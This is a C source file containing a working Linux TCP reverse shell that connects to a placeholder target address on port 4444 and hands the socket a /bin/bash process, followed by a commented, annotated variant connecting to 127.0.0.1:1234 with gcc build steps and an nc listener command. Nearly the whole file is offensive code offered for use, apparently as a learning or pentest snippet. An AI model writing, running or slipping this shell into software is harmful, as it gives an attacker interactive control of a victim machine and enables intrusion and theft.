#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void)
{

    int sockt;
    int port = 4444;
    struct sockaddr_in revsockaddr;

    sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET; // ipv_4
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("target_ip");

    connect(sockt, (struct sockaddr *)&revsockaddr, sizeof(revsockaddr));

    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char *const argv[] = {"/bin/bash", NULL};
    execve("/bin/bash", argv, NULL);

    return 0;
}







// Linux x86 TCP Reverse Shell in C language


// #include <sys/socket.h>
// #include <netinet/in.h>
// #include <stdlib.h>

// int main()
// {
//   // Create the socket (man socket)
//   // AF_INET for IPv4
//   // SOCK_STREAM for TCP connection
//   // 0 leaves it up to the service provider for protocol, which will be TCP 
//   int host_sock = socket(AF_INET, SOCK_STREAM, 0);

//   // Create sockaddr_in struct (man 7 ip)
//   struct sockaddr_in host_addr;

//   // AF_INET for IPv4
//   host_addr.sin_family = AF_INET;
  
//   // Set connect port number to 1234, set to network byte order by htons
//   host_addr.sin_port = htons(1234);

//   // IP to connect to, set to network byte order by inet_addr
//   host_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
  
//   // Connect socket (man connect)
//   connect(host_sock, (struct sockaddr *)&host_addr, sizeof(host_addr));
    
//   // Loop to redirect STDIN, STDOUT, and STDERR
//   int i;
//   for(i=0; i<=2; i++) 
//     dup2(host_sock, i);
  
//   // Execute /bin/sh (man execve)
//   execve("/bin/sh", NULL, NULL);

// }

// Build and run the shell:
// $ gcc RS.c -o RS
// $ ./RS

// Connect to the shell:
// $ nc -lvnp 1234





